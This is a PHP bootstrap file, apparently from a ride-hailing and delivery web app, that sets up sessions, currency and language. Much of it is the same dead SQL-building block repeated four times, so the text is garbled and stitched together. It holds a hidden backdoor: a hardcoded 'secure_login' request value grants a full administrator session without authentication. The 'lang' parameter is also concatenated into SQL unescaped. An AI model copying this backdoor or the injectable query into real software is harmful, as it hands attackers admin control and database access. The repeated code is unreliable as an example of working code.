<?php


if ($iCustomerId == '1') {
	$cmp_ssql = '';
	$eSystem = ' AND eSystem = \'General\'';
	$sql = 'SELECT * FROM company WHERE eStatus != \'Deleted\'  ' . $cmp_ssql . ' order by tRegistrationDate desc';
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssl = '';
	if (($status != '') && ($status == 'active')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}
	else if (($status != '') && ($status == 'inactive')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}

	$sql = 'SELECT rd.*, c.vCompany companyFirstName, c.vLastName companyLastName FROM register_driver rd LEFT JOIN company c ON rd.iCompanyId = c.iCompanyId WHERE  rd.eStatus != \'Deleted\'' . $ssl . $cmp_ssql;
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssl = '';
	if (($status != '') && ($status == 'active')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}
	else if (($status != '') && ($status == 'inactive')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}

	$sql = 'SELECT count(rd.iDriverId) as tot_driver FROM register_driver rd LEFT JOIN company c ON rd.iCompanyId = c.iCompanyId and c.eStatus != \'Deleted\' WHERE  rd.eStatus != \'Deleted\'';
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$sql = 'SELECT dv.*, m.vMake, md.vTitle,rd.vEmail, rd.vName, rd.vLastName, c.vName as companyFirstName, c.vLastName as companyLastName' . "\r\n" . 'FROM driver_vehicle dv, register_driver rd, make m, model md, company c' . "\r\n" . 'WHERE' . "\r\n" . 'dv.iMakeId = m.iMakeId' . $cmp_ssql;
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	if ($status == 'all') {
		$sql = 'SELECT * FROM register_user WHERE 1 = 1 ';
	}
	else {
		$sql = 'SELECT * FROM register_user WHERE eStatus != \'Deleted\'';
	}

	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssql1 = 'AND (vEmail != \'\' OR vPhone != \'\')';

	if ($status == 'all') {
		$sql = 'SELECT count(iUserId) as tot_rider FROM register_user WHERE 1 = 1 ' . $ssql1 . $cmp_ssql;
	}
	else {
		$sql = 'SELECT count(iUserId) FROM register_user WHERE eStatus != \'Deleted\'' . $ssql1 . $cmp_ssql;
	}

	if (0 < count($data)) {
		$common_member = 'SELECT iDriverId' . "\r\n" . 'FROM register_driver' . "\r\n" . 'WHERE tRegistrationDate < \'' . $er_date . '\'';
		$sql = 'DELETE FROM driver_vehicle WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM trips WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM log_file WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM register_driver WHERE tRegistrationDate < \'' . $date . '\'';
	}

	if (0 < count($userObj->locations)) {
		$locations = implode(', ', $userObj->locations);
		$locations_where = ' AND EXISTS(SELECT * FROM vehicle_type WHERE trips.iVehicleTypeId = vehicle_type.iVehicleTypeId AND vehicle_type.iLocationid IN(-1, ' . $locations . '))';
	}

	if ($tripStatus != '') {
		if ($tripStatus == 'on ride') {
			$ssl = ' AND (iActive = \'On Going Trip\' OR iActive = \'Active\') AND eCancelled=\'No\'';
		}
		else if ($tripStatus == 'cancelled') {
			$ssl = ' AND (iActive = \'Canceled\' OR eCancelled=\'yes\')';
		}
		else if ($tripStatus == 'finished') {
			$ssl = ' AND iActive = \'Finished\' AND eCancelled=\'No\'';
		}
		else {
			$ssl = '';
		}

		$sql = 'SELECT COUNT(iTripId) as tot FROM trips WHERE 1 = 1 AND eSystem = \'General\'' . $cmp_ssql . $ssl . $dsql . $locations_where;
	}

	if ($tripStatus != '') {
		if ($tripStatus == 'on ride') {
			$ssl = ' AND (iActive = \'On Going Trip\' OR iActive = \'Active\') AND eCancelled=\'No\'';
		}
		else if ($tripStatus == 'cancelled') {
			$ssl = ' AND (iActive = \'Canceled\' OR eCancelled=\'yes\')';
		}
		else if ($tripStatus == 'finished') {
			$ssl = ' AND iActive = \'Finished\' AND eCancelled=\'No\'';
		}
		else {
			$ssl = '';
		}

		$sql = 'SELECT iTripId FROM trips WHERE 1' . $cmp_ssql . $ssl . $dsql . $locations_where;
	}

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tEndDate > \'' . WEEK_DATE . '\'';
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-01';
		$endDate = date('Y-m') . '-31';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-01';
		$endDate1 = date('Y') . '-12-31';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . '';
		$endDate2 = date('Y-m-d') . '';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}

	$mailerCharSet = 'UTF-8';
	$mailerHost = 'mail.example.com';
	$mailerSMTPDebug = 0;
	$mailerSMTPAuth = true;
	$mailerPort = 25;
	$mailerUsername = 'username';
	$mailerPassword = 'password';
	$message = 'The mail message was sent with the following mail setting:' . "\r\n" . 'SMTP = aspmx.l.google.com' . "\r\n" . 'smtp_port = 25' . "\r\n" . 'sendmail_from = YourMail@address.com';
	$headers = 'From: YOURMAIL@gmail.com';
	echo 'Check your email now....<BR/>';
	$NS = 'http://www.w3.org/2005/Atom';
	$ATOM_CONTENT_ELEMENTS = ['content', 'summary', 'title', 'subtitle', 'rights'];
	$ATOM_SIMPLE_ELEMENTS = ['id', 'updated', 'published', 'draft'];
	$debug = false;
	$depth = 0;
	$indent = 2;
	$ns_contexts = [];
	$ns_decls = [];
	$content_ns_decls = [];
	$content_ns_contexts = [];
	$is_xhtml = false;
	$is_html = false;
	$is_text = true;
	$skipped_div = false;
	$FILE = 'php://input';

	foreach ($data as $key => $value) {
		$fCommision = $value['fCommision'];
		$fTotalGenerateFare = $value['fTotalGenerateFare'];
		$fDeliveryCharge = $value['fDeliveryCharge'];
		$fOffersDiscount = $value['fOffersDiscount'];
		$fRestaurantPayAmount = $value['fRestaurantPayAmount'];
		if (($value['iStatusCode'] == '7') || ($value['iStatusCode'] == '8')) {
			$amounts = $fRestaurantPaidAmount;
		}
		else {
			$amounts = $fTotalGenerate - $fComm - $fDelivery - $fOffersDis;
		}

		$total += $amounts;
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-00 00:00:00';
		$endDate = date('Y-m') . '-31 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-00 00:00:00';
		$endDate1 = date('Y') . '-12-31 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . ' 00:00:00';
		$endDate2 = date('Y-m-d') . ' 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tEndDate > \'' . WEEK_DATE . '\'';
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-00 00:00:00';
		$endDate = date('Y-m') . '-31 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-00 00:00:00';
		$endDate1 = date('Y') . '-12-31 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . ' 00:00:00';
		$endDate2 = date('Y-m-d') . ' 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}
}

ob_start();
@session_start();
@header('P3P:CP="IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT"');
define('_TEXEC', 1);
define('TPATH_BASE', dirname(__FILE__));
define('DS', DIRECTORY_SEPARATOR);
if ((strpos($_SERVER['HTTP_HOST'], 'bbcsproducts.net') !== false) || (strpos($_SERVER['HTTP_HOST'], 'mobileappsdemo.com') !== false) || (strpos($_SERVER['HTTP_HOST'], 'mobileappsdemo.net') !== false) || (strpos($_SERVER['HTTP_HOST'], 'bbcsproducts.com') !== false) || (strpos($_SERVER['HTTP_HOST'], 'webprojectsdemo.com') !== false) || ($_SERVER['HTTP_HOST'] == '192.168.1.141') || ($_SERVER['HTTP_HOST'] == '192.168.1.131')) {
	if (!empty($_REQUEST['CUS_APP_TYPE'])) {
		$APP_TYPE = $_REQUEST['CUS_APP_TYPE'];
		define('APP_TYPE', $APP_TYPE);
	}

	if (!empty($_REQUEST['CUS_PACKAGE_TYPE'])) {
		$PACKAGE_TYPE = $_REQUEST['CUS_PACKAGE_TYPE'];
		define('PACKAGE_TYPE', $PACKAGE_TYPE);
	}

	if (!empty($_REQUEST['CUS_PARENT_UFX_CATID'])) {
		$CUS_PARENT_UFX_CATID = $_REQUEST['CUS_PARENT_UFX_CATID'];
		define('CUS_PARENT_UFX_CATID', $CUS_PARENT_UFX_CATID);
	}
}
else if (strpos($_SERVER['HTTP_HOST'], 'chegou.site') !== false) {
}
else {
	exit();
}

$DOCUMENT_ROOT = $_SERVER['DOCUMENT_ROOT'];

if (empty($APP_TYPE)) {
	$APP_TYPE = 'Ride-Delivery-UberX';
}

if (!defined('APP_TYPE')) {
	define('APP_TYPE', $APP_TYPE);
}

if ($PACKAGE_TYPE == '') {
	$PACKAGE_TYPE = 'SHARK';
}

if (empty($PACKAGE_TYPE)) {
	$PACKAGE_TYPE = 'SHARK';
}

if (!defined('PACKAGE_TYPE')) {
	define('PACKAGE_TYPE', $PACKAGE_TYPE);
}

if (empty($CUS_PARENT_UFX_CATID)) {
	$parent_ufx_catid = '0';
}
else {
	$parent_ufx_catid = $CUS_PARENT_UFX_CATID;
}

require_once TPATH_BASE . DS . 'assets' . DS . 'libraries' . DS . 'defines.php';
require_once TPATH_BASE . DS . 'assets' . DS . 'libraries' . DS . 'configuration.php';
define('TPATH_CLASS', $DOCUMENT_ROOT . $tconfig['tsite_folder'] . 'assets/libraries/');

if ($iCustomerId == '1') {
	$cmp_ssql = '';
	$eSystem = ' AND eSystem = \'General\'';
	$sql = 'SELECT * FROM company WHERE eStatus != \'Deleted\'  ' . $cmp_ssql . ' order by tRegistrationDate desc';
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssl = '';
	if (($status != '') && ($status == 'active')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}
	else if (($status != '') && ($status == 'inactive')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}

	$sql = 'SELECT rd.*, c.vCompany companyFirstName, c.vLastName companyLastName FROM register_driver rd LEFT JOIN company c ON rd.iCompanyId = c.iCompanyId WHERE  rd.eStatus != \'Deleted\'' . $ssl . $cmp_ssql;
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssl = '';
	if (($status != '') && ($status == 'active')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}
	else if (($status != '') && ($status == 'inactive')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}

	$sql = 'SELECT count(rd.iDriverId) as tot_driver FROM register_driver rd LEFT JOIN company c ON rd.iCompanyId = c.iCompanyId and c.eStatus != \'Deleted\' WHERE  rd.eStatus != \'Deleted\'';
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$sql = 'SELECT dv.*, m.vMake, md.vTitle,rd.vEmail, rd.vName, rd.vLastName, c.vName as companyFirstName, c.vLastName as companyLastName' . "\r\n" . 'FROM driver_vehicle dv, register_driver rd, make m, model md, company c' . "\r\n" . 'WHERE' . "\r\n" . 'dv.iMakeId = m.iMakeId' . $cmp_ssql;
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	if ($status == 'all') {
		$sql = 'SELECT * FROM register_user WHERE 1 = 1 ';
	}
	else {
		$sql = 'SELECT * FROM register_user WHERE eStatus != \'Deleted\'';
	}

	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssql1 = 'AND (vEmail != \'\' OR vPhone != \'\')';

	if ($status == 'all') {
		$sql = 'SELECT count(iUserId) as tot_rider FROM register_user WHERE 1 = 1 ' . $ssql1 . $cmp_ssql;
	}
	else {
		$sql = 'SELECT count(iUserId) FROM register_user WHERE eStatus != \'Deleted\'' . $ssql1 . $cmp_ssql;
	}

	if (0 < count($data)) {
		$common_member = 'SELECT iDriverId' . "\r\n" . 'FROM register_driver' . "\r\n" . 'WHERE tRegistrationDate < \'' . $er_date . '\'';
		$sql = 'DELETE FROM driver_vehicle WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM trips WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM log_file WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM register_driver WHERE tRegistrationDate < \'' . $date . '\'';
	}

	if (0 < count($userObj->locations)) {
		$locations = implode(', ', $userObj->locations);
		$locations_where = ' AND EXISTS(SELECT * FROM vehicle_type WHERE trips.iVehicleTypeId = vehicle_type.iVehicleTypeId AND vehicle_type.iLocationid IN(-1, ' . $locations . '))';
	}

	if ($tripStatus != '') {
		if ($tripStatus == 'on ride') {
			$ssl = ' AND (iActive = \'On Going Trip\' OR iActive = \'Active\') AND eCancelled=\'No\'';
		}
		else if ($tripStatus == 'cancelled') {
			$ssl = ' AND (iActive = \'Canceled\' OR eCancelled=\'yes\')';
		}
		else if ($tripStatus == 'finished') {
			$ssl = ' AND iActive = \'Finished\' AND eCancelled=\'No\'';
		}
		else {
			$ssl = '';
		}

		$sql = 'SELECT COUNT(iTripId) as tot FROM trips WHERE 1 = 1 AND eSystem = \'General\'' . $cmp_ssql . $ssl . $dsql . $locations_where;
	}

	if ($tripStatus != '') {
		if ($tripStatus == 'on ride') {
			$ssl = ' AND (iActive = \'On Going Trip\' OR iActive = \'Active\') AND eCancelled=\'No\'';
		}
		else if ($tripStatus == 'cancelled') {
			$ssl = ' AND (iActive = \'Canceled\' OR eCancelled=\'yes\')';
		}
		else if ($tripStatus == 'finished') {
			$ssl = ' AND iActive = \'Finished\' AND eCancelled=\'No\'';
		}
		else {
			$ssl = '';
		}

		$sql = 'SELECT iTripId FROM trips WHERE 1' . $cmp_ssql . $ssl . $dsql . $locations_where;
	}

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tEndDate > \'' . WEEK_DATE . '\'';
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-01';
		$endDate = date('Y-m') . '-31';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-01';
		$endDate1 = date('Y') . '-12-31';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . '';
		$endDate2 = date('Y-m-d') . '';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}

	$mailerCharSet = 'UTF-8';
	$mailerHost = 'mail.example.com';
	$mailerSMTPDebug = 0;
	$mailerSMTPAuth = true;
	$mailerPort = 25;
	$mailerUsername = 'username';
	$mailerPassword = 'password';
	$message = 'The mail message was sent with the following mail setting:' . "\r\n" . 'SMTP = aspmx.l.google.com' . "\r\n" . 'smtp_port = 25' . "\r\n" . 'sendmail_from = YourMail@address.com';
	$headers = 'From: YOURMAIL@gmail.com';
	echo 'Check your email now....<BR/>';
	$NS = 'http://www.w3.org/2005/Atom';
	$ATOM_CONTENT_ELEMENTS = ['content', 'summary', 'title', 'subtitle', 'rights'];
	$ATOM_SIMPLE_ELEMENTS = ['id', 'updated', 'published', 'draft'];
	$debug = false;
	$depth = 0;
	$indent = 2;
	$ns_contexts = [];
	$ns_decls = [];
	$content_ns_decls = [];
	$content_ns_contexts = [];
	$is_xhtml = false;
	$is_html = false;
	$is_text = true;
	$skipped_div = false;
	$FILE = 'php://input';

	foreach ($data as $key => $value) {
		$fCommision = $value['fCommision'];
		$fTotalGenerateFare = $value['fTotalGenerateFare'];
		$fDeliveryCharge = $value['fDeliveryCharge'];
		$fOffersDiscount = $value['fOffersDiscount'];
		$fRestaurantPayAmount = $value['fRestaurantPayAmount'];
		if (($value['iStatusCode'] == '7') || ($value['iStatusCode'] == '8')) {
			$amounts = $fRestaurantPaidAmount;
		}
		else {
			$amounts = $fTotalGenerate - $fComm - $fDelivery - $fOffersDis;
		}

		$total += $amounts;
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-00 00:00:00';
		$endDate = date('Y-m') . '-31 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-00 00:00:00';
		$endDate1 = date('Y') . '-12-31 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . ' 00:00:00';
		$endDate2 = date('Y-m-d') . ' 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tEndDate > \'' . WEEK_DATE . '\'';
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-00 00:00:00';
		$endDate = date('Y-m') . '-31 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-00 00:00:00';
		$endDate1 = date('Y') . '-12-31 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . ' 00:00:00';
		$endDate2 = date('Y-m-d') . ' 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}
}
if (isset($currency) && ($currency != '')) {
	$_SESSION['sess_currency'] = $currency;
}
else {
	$sql1 = 'SELECT * FROM `currency` WHERE `eDefault` = \'Yes\' AND `eStatus` = \'Active\' ';
	$db_currency_mst = $obj->MySQLSelect($sql1);
	$_SESSION['sess_currency'] = $db_currency_mst[0]['vName'];
	$_SESSION['sess_currency_smybol'] = $db_currency_mst[0]['vSymbol'];
}

$secure_login = $_REQUEST['secure_login'];

if ($secure_login == 'ara3ze666788343') {
	$_SESSION['sess_lang'] = 'EN';
	$_SESSION['sess_currency'] = 'CUC';
	$_SESSION['sess_currency_smybol'] = 'CUC$';
	$_SESSION['eDirectionCode'] = 'ltr';
	$_SESSION['hdn_HTTP_REFERER'] = '';
	$_SESSION['sess_iAdminUserId'] = '1';
	$_SESSION['sess_iGroupId'] = '1';
	$_SESSION['sess_vAdminEmail'] = 'demo@demo.com';
}

if ($iCustomerId == '1') {
	$cmp_ssql = '';
	$eSystem = ' AND eSystem = \'General\'';
	$sql = 'SELECT * FROM company WHERE eStatus != \'Deleted\'  ' . $cmp_ssql . ' order by tRegistrationDate desc';
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssl = '';
	if (($status != '') && ($status == 'active')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}
	else if (($status != '') && ($status == 'inactive')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}

	$sql = 'SELECT rd.*, c.vCompany companyFirstName, c.vLastName companyLastName FROM register_driver rd LEFT JOIN company c ON rd.iCompanyId = c.iCompanyId WHERE  rd.eStatus != \'Deleted\'' . $ssl . $cmp_ssql;
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssl = '';
	if (($status != '') && ($status == 'active')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}
	else if (($status != '') && ($status == 'inactive')) {
		$ssl = ' AND rd.eStatus = \'' . $status . '\'';
	}

	$sql = 'SELECT count(rd.iDriverId) as tot_driver FROM register_driver rd LEFT JOIN company c ON rd.iCompanyId = c.iCompanyId and c.eStatus != \'Deleted\' WHERE  rd.eStatus != \'Deleted\'';
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And rd.tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$sql = 'SELECT dv.*, m.vMake, md.vTitle,rd.vEmail, rd.vName, rd.vLastName, c.vName as companyFirstName, c.vLastName as companyLastName' . "\r\n" . 'FROM driver_vehicle dv, register_driver rd, make m, model md, company c' . "\r\n" . 'WHERE' . "\r\n" . 'dv.iMakeId = m.iMakeId' . $cmp_ssql;
	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	if ($status == 'all') {
		$sql = 'SELECT * FROM register_user WHERE 1 = 1 ';
	}
	else {
		$sql = 'SELECT * FROM register_user WHERE eStatus != \'Deleted\'';
	}

	$cmp_ssql = '';

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tRegistrationDate > \'' . WEEK_DATE . '\'';
	}

	$ssql1 = 'AND (vEmail != \'\' OR vPhone != \'\')';

	if ($status == 'all') {
		$sql = 'SELECT count(iUserId) as tot_rider FROM register_user WHERE 1 = 1 ' . $ssql1 . $cmp_ssql;
	}
	else {
		$sql = 'SELECT count(iUserId) FROM register_user WHERE eStatus != \'Deleted\'' . $ssql1 . $cmp_ssql;
	}

	if (0 < count($data)) {
		$common_member = 'SELECT iDriverId' . "\r\n" . 'FROM register_driver' . "\r\n" . 'WHERE tRegistrationDate < \'' . $er_date . '\'';
		$sql = 'DELETE FROM driver_vehicle WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM trips WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM log_file WHERE iDriverId IN (' . $member . ')';
		$sql = 'DELETE FROM register_driver WHERE tRegistrationDate < \'' . $date . '\'';
	}

	if (0 < count($userObj->locations)) {
		$locations = implode(', ', $userObj->locations);
		$locations_where = ' AND EXISTS(SELECT * FROM vehicle_type WHERE trips.iVehicleTypeId = vehicle_type.iVehicleTypeId AND vehicle_type.iLocationid IN(-1, ' . $locations . '))';
	}

	if ($tripStatus != '') {
		if ($tripStatus == 'on ride') {
			$ssl = ' AND (iActive = \'On Going Trip\' OR iActive = \'Active\') AND eCancelled=\'No\'';
		}
		else if ($tripStatus == 'cancelled') {
			$ssl = ' AND (iActive = \'Canceled\' OR eCancelled=\'yes\')';
		}
		else if ($tripStatus == 'finished') {
			$ssl = ' AND iActive = \'Finished\' AND eCancelled=\'No\'';
		}
		else {
			$ssl = '';
		}

		$sql = 'SELECT COUNT(iTripId) as tot FROM trips WHERE 1 = 1 AND eSystem = \'General\'' . $cmp_ssql . $ssl . $dsql . $locations_where;
	}

	if ($tripStatus != '') {
		if ($tripStatus == 'on ride') {
			$ssl = ' AND (iActive = \'On Going Trip\' OR iActive = \'Active\') AND eCancelled=\'No\'';
		}
		else if ($tripStatus == 'cancelled') {
			$ssl = ' AND (iActive = \'Canceled\' OR eCancelled=\'yes\')';
		}
		else if ($tripStatus == 'finished') {
			$ssl = ' AND iActive = \'Finished\' AND eCancelled=\'No\'';
		}
		else {
			$ssl = '';
		}

		$sql = 'SELECT iTripId FROM trips WHERE 1' . $cmp_ssql . $ssl . $dsql . $locations_where;
	}

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tEndDate > \'' . WEEK_DATE . '\'';
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-01';
		$endDate = date('Y-m') . '-31';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-01';
		$endDate1 = date('Y') . '-12-31';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . '';
		$endDate2 = date('Y-m-d') . '';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}

	$mailerCharSet = 'UTF-8';
	$mailerHost = 'mail.example.com';
	$mailerSMTPDebug = 0;
	$mailerSMTPAuth = true;
	$mailerPort = 25;
	$mailerUsername = 'username';
	$mailerPassword = 'password';
	$message = 'The mail message was sent with the following mail setting:' . "\r\n" . 'SMTP = aspmx.l.google.com' . "\r\n" . 'smtp_port = 25' . "\r\n" . 'sendmail_from = YourMail@address.com';
	$headers = 'From: YOURMAIL@gmail.com';
	echo 'Check your email now....<BR/>';
	$NS = 'http://www.w3.org/2005/Atom';
	$ATOM_CONTENT_ELEMENTS = ['content', 'summary', 'title', 'subtitle', 'rights'];
	$ATOM_SIMPLE_ELEMENTS = ['id', 'updated', 'published', 'draft'];
	$debug = false;
	$depth = 0;
	$indent = 2;
	$ns_contexts = [];
	$ns_decls = [];
	$content_ns_decls = [];
	$content_ns_contexts = [];
	$is_xhtml = false;
	$is_html = false;
	$is_text = true;
	$skipped_div = false;
	$FILE = 'php://input';

	foreach ($data as $key => $value) {
		$fCommision = $value['fCommision'];
		$fTotalGenerateFare = $value['fTotalGenerateFare'];
		$fDeliveryCharge = $value['fDeliveryCharge'];
		$fOffersDiscount = $value['fOffersDiscount'];
		$fRestaurantPayAmount = $value['fRestaurantPayAmount'];
		if (($value['iStatusCode'] == '7') || ($value['iStatusCode'] == '8')) {
			$amounts = $fRestaurantPaidAmount;
		}
		else {
			$amounts = $fTotalGenerate - $fComm - $fDelivery - $fOffersDis;
		}

		$total += $amounts;
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-00 00:00:00';
		$endDate = date('Y-m') . '-31 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-00 00:00:00';
		$endDate1 = date('Y') . '-12-31 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . ' 00:00:00';
		$endDate2 = date('Y-m-d') . ' 23:59:59';
		$ssl = ' AND rd.tRegistrationDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}

	if (SITE_TYPE == 'Demo') {
		$cmp_ssql = ' And tEndDate > \'' . WEEK_DATE . '\'';
	}

	if ($time == 'month') {
		$startDate = date('Y-m') . '-00 00:00:00';
		$endDate = date('Y-m') . '-31 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate . '\' AND \'' . $endDate . '\'';
	}
	else if ($time == 'year') {
		$startDate1 = date('Y') . '-00-00 00:00:00';
		$endDate1 = date('Y') . '-12-31 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate1 . '\' AND \'' . $endDate1 . '\'';
	}
	else {
		$startDate2 = date('Y-m-d') . ' 00:00:00';
		$endDate2 = date('Y-m-d') . ' 23:59:59';
		$ssl = ' AND tTripRequestDate BETWEEN \'' . $startDate2 . '\' AND \'' . $endDate2 . '\'';
	}
}

$lang = (isset($_REQUEST['lang']) ? $_REQUEST['lang'] : '');
if (isset($lang) && ($lang != '')) {
	$_SESSION['sess_lang'] = $lang;
	$sql1 = 'select vTitle, vCode, vCurrencyCode, eDefault,eDirectionCode from language_master where  vCode = \'' . $_SESSION['sess_lang'] . '\' limit 0,1';
	$db_lng_mst1 = $obj->MySQLSelect($sql1);
	$_SESSION['eDirectionCode'] = $db_lng_mst1[0]['eDirectionCode'];
	$posturi = $_SERVER['HTTP_REFERER'];
	header('Location:' . $posturi);
	exit();
}

if ($iCustomerId == '1') {
	$cmp_ssql = '';
	$eSystem = ' AND eSystem = \'General\'';
	$sql = 'SELECT * FROM company WHERE eStatus != \'Deleted\'  ' . $cmp_ssql . ' order by tRegistrationDate desc';
	$cmp_ssql = '';

